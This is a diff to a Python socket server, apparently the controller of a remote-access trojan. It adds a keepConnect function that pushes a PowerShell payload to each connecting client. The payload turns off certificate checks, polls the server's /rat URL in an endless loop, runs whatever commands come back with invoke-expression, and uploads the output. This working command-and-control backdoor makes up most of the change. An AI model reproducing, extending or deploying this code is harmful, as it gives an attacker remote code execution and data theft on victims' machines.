@@ -48,12 +48,29 @@ def service():
             conn, addr = sock.accept()
             conn.setblocking(1)
             print "Connected with " + addr[0] + ":" + str(addr[1])
-            print "Totle Client: %d" %clientCount 
+            print "Totle Client: %d" %clientCount
+            conn.send(keepConnect("127.0.0.1",str(port)))
             allConnections.append(conn)
             allAddresses.append(addr)
         except:
             break
 
+def keepConnect(ip,port):
+    message = '''        			
+                $s = "http://%s:%s/rat"
+                                    $w = New-Object Net.WebClient 
+                                    while(`$true)
+                                    {
+                                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+                                    $r = $w.DownloadString($s)
+                                    while($r) {
+                                            $o = invoke-expression $r | out-string 
+                                            $w.UploadString($s, $o)	
+                                            break
+                                    }
+                                    }
+	      '''%(ip,port)
+    return message
 
 def sendMessage(msg,conn):
     try:
